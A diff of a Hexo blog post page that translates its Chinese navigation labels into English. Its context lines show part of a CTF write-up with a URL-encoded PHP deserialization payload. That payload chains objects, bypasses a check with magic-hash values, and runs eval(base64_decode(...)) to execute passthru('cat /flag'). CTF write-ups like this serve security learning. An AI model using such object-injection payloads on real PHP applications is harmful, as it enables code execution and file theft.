@@ -14,10 +14,7 @@
   
 <meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="atom.xml" title="D'b8Gr的小站~" type="application/atom+xml">
 </head>
-<body
-  class="theme-db8gr layout-post"
-  data-lazyload="true"
-  data-lazyload-root-margin="240px 0px">
+<body class="theme-db8gr layout-post">
   <canvas class="ambient-rain" id="ambient-rain" aria-hidden="true"></canvas>
   <div class="scroll-progress" aria-hidden="true"><span id="scroll-progress-bar"></span></div>
   
@@ -33,27 +30,27 @@
 <header class="terminal-nav" id="db8gr-nav">
   <div class="nav-glass">
     <div class="nav-head">
-      <a class="nav-brand" href="../../index.html" aria-label="返回首页">
+      <a class="nav-brand" href="../../index.html" aria-label="Back to home">
         <span class="brand-prompt">root@</span><span>D&#39;b8Gr的小站~</span><span class="brand-colon">:</span><span class="brand-motto" id="brand-type" data-text="I hack,therefore i am"></span><span class="brand-cursor" aria-hidden="true">_</span>
       </a>
-      <button class="nav-toggle" id="nav-toggle" type="button" aria-controls="nav-menu" aria-expanded="false" aria-label="展开导航">
+      <button class="nav-toggle" id="nav-toggle" type="button" aria-controls="nav-menu" aria-expanded="false" aria-label="Open navigation">
         <span></span>
         <span></span>
         <span></span>
       </button>
     </div>
-    <nav class="nav-links" id="nav-menu" aria-label="主导航">
-      <a class="nav-link" href="../../index.html">首页</a>
+    <nav class="nav-links" id="nav-menu" aria-label="Main navigation">
+      <a class="nav-link" href="../../index.html">Home</a>
       <div class="nav-item nav-dropdown">
-        <a class="nav-link dropdown-trigger" href="../../archives/">文章</a>
-        <div class="dropdown-menu" aria-label="文章子菜单">
-          <a href="../../categories/">分类</a>
-          <a href="../../tags/">标签</a>
-          <a href="../../archives/">归档</a>
+        <a class="nav-link dropdown-trigger" href="../../archives/">Posts</a>
+        <div class="dropdown-menu" aria-label="Posts submenu">
+          <a href="../../categories/">Categories</a>
+          <a href="../../tags/">Tags</a>
+          <a href="../../archives/">Archives</a>
         </div>
       </div>
-      <a class="nav-link" href="../../links/">友链</a>
-      <a class="nav-link" href="../../about/">关于</a>
+      <a class="nav-link" href="../../links/">Friends</a>
+      <a class="nav-link" href="../../about/">About</a>
     </nav>
   </div>
 </header>
@@ -67,9 +64,9 @@
     <div class="post-meta">
       <time>2025-11-01</time>
       <span>/</span>
-      <span>约 1451 字</span>
+      <span>1451 words</span>
       <span>/</span>
-      <span>5 分钟阅读</span>
+      <span>5 min read</span>
       
         <span>/</span>
         <span>CTF相关</span>
@@ -95,7 +92,7 @@
 
 <p>得到：<code>O%3A5%3A%22Start%22%3A2%3A%7Bs%3A6%3A%22ishero%22%3Bs%3A5%3A%22herox%22%3Bs%3A9%3A%22adventure%22%3BO%3A5%3A%22Sword%22%3A3%3A%7Bs%3A5%3A%22test1%22%3Bs%3A9%3A%22240610708%22%3Bs%3A5%3A%22test2%22%3Bs%3A7%3A%22QNKCDZO%22%3Bs%3A2%3A%22go%22%3BO%3A6%3A%22Mon3tr%22%3A1%3A%7Bs%3A3%3A%22end%22%3Bs%3A22%3A%22print_r%28scandir%28%27%2F%27%29%29%3B%22%3B%7D%7D%7D</code></p>
 <p>先调用类似<code>ls /</code>命令查看文件夹，得到：</p>
-<p><img fetchpriority="low" decoding="async" loading="lazy" src="/images/week4_1.png" alt="week4_1"></p>
+<p><img src="/images/week4_1.png" alt="week4_1"></p>
 <p>然后再用<code>eval()函数，再base64编码</code>，改<code>$mon3tr-&gt;end = &quot;print_r(scandir(&#39;/&#39;));&quot;;</code>为<code>$mon3tr-&gt;end = &quot;eval(base64_decode(&#39;cGFzc3RocnUoJ2NhdCAvZmxhZycpOw==&#39;));&quot;;</code>，执行php代码，得到：<code>O%3A5%3A%22Start%22%3A2%3A%7Bs%3A6%3A%22ishero%22%3Bs%3A5%3A%22herox%22%3Bs%3A9%3A%22adventure%22%3BO%3A5%3A%22Sword%22%3A3%3A%7Bs%3A5%3A%22test1%22%3Bs%3A9%3A%22240610708%22%3Bs%3A5%3A%22test2%22%3Bs%3A7%3A%22QNKCDZO%22%3Bs%3A2%3A%22go%22%3BO%3A6%3A%22Mon3tr%22%3A1%3A%7Bs%3A3%3A%22end%22%3Bs%3A56%3A%22eval%28base64_decode%28%27cGFzc3RocnUoJ2NhdCAvZmxhZycpOw%3D%3D%27%29%29%3B%22%3B%7D%7D%7D</code>，</p>
 <p>POST请求，最终得到flag：flag{e24449c0-752e-42fe-8e9a-cff80fe7e221}</p>
 <h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Week4-Myneighbors"><a href="#Week4-Myneighbors" class="headerlink" title="[Week4] Myneighbors"></a>[Week4] Myneighbors</h3><hr>
@@ -124,8 +121,8 @@
     </div>
 
     
-      <aside class="post-toc" aria-label="目录">
-        <div class="toc-title">目录</div>
+      <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">TOC</div>
         <ol class="post-toc-list"><li class="post-toc-list-item post-toc-list-level-2"><a class="post-toc-list-link" href="#WEB"><span class="post-toc-list-text">WEB</span></a><ol class="post-toc-list-child"><li class="post-toc-list-item post-toc-list-level-3"><a class="post-toc-list-link" href="#Week4-Path-to-Hero"><span class="post-toc-list-text">[Week4] Path to Hero</span></a></li></ol></li><li class="post-toc-list-item post-toc-list-level-2"><a class="post-toc-list-link" href="#Crypto"><span class="post-toc-list-text">Crypto</span></a><ol class="post-toc-list-child"><li class="post-toc-list-item post-toc-list-level-3"><a class="post-toc-list-link" href="#Week4-Myneighbors"><span class="post-toc-list-text">[Week4] Myneighbors</span></a></li></ol></li></ol>
       </aside>
     
@@ -149,7 +146,7 @@
       
     </div>
     
-      <section class="related-posts" aria-label="相关文章">
+      <section class="related-posts" aria-label="Related posts">
         <div class="related-title">RELATED.LOG</div>
         <div class="related-list">
           
